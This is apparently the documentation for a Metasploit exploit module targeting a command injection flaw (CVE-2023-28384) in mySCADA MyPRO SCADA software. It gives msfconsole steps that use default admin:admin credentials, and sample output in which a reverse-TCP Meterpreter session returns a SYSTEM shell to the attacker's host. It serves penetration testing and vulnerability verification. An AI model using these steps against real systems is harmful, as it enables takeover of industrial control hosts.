## Vulnerable Application

**Vulnerability Description**

This module exploits a command injection vulnerability in mySCADA MyPRO <= v8.28.0 (CVE-2023-28384).

An authenticated remote attacker can exploit this vulnerability to inject arbitrary OS commands, which will get executed in the context of
`NT AUTHORITY\SYSTEM`.
This module uses the default admin:admin credentials, but any account configured on the system can be used to exploit this issue.

Versions <= 8.28.0 are affected. CISA published [ICSA-23-096-06](https://www.cisa.gov/news-events/ics-advisories/icsa-23-096-06) to cover
the security issues. The official changelog for the updated version, v8.29.0, is available
[here](https://web.archive.org/web/20230320130928/https://www.myscada.org/changelog/?section=version-8-29-0), although it only mentions a
"General security improvement" without further details.

**Vulnerable Application Installation**

A trial version of the software can be obtained from [the vendor](http://nsa.myscada.org/myPRO/WIN/myPRO_x64_8.28.0.exe).
For the product to work correctly, the project and log directories need to be configured first, which can be done through the web inteface
(navigate to System > Storage).

**Successfully tested on**

- mySCADA MyPRO 8.28.0 on Windows 10 22H2
- mySCADA MyPRO 8.27.0 on Windows 10 22H2
- mySCADA MyPRO 8.26.0 on Windows 10 22H2

## Verification Steps

1. Install the application
2. Configure the project and log paths (System > Storage in the web interface, running by default on TCP ports 80 & 443)
3. Start `msfconsole` and run the following commands:

```
msf6 > use exploit/windows/scada/mypro_cmdexe
[*] No payload configured, defaulting to cmd/windows/http/x64/meterpreter/reverse_tcp
msf6 exploit(windows/scada/mypro_cmdexe) > set RHOSTS <IP>
msf6 exploit(windows/scada/mypro_cmdexe) > exploit
```

You should get a meterpreter session in the context of `NT AUTHORITY\SYSTEM`.

## Options
### USERNAME

The username of a MyPRO user (default: admin)

### PASSWORD

The associated password of the MyPRO user (default: admin)

## Scenarios

Running the exploit against MyPRO v8.28.0 on Windows 10 22H2, using curl as a fetch command, should result in an output similar to the
following:

```
msf6 exploit(windows/scada/mypro_cmdexe) > exploit

[*] Started reverse TCP handler on 192.168.1.241:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Checking credentials...
[+] Credentials are working.
[*] Sending command injection...
[*] Sending stage (201798 bytes) to 192.168.1.239
[*] Meterpreter session 12 opened (192.168.1.241:4444 -> 192.168.1.239:57382) at 2024-07-23 23:38:12 -0400
[*] Exploit finished, check thy shell.

meterpreter > shell
Process 2632 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19045.4651]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
nt authority\system
```
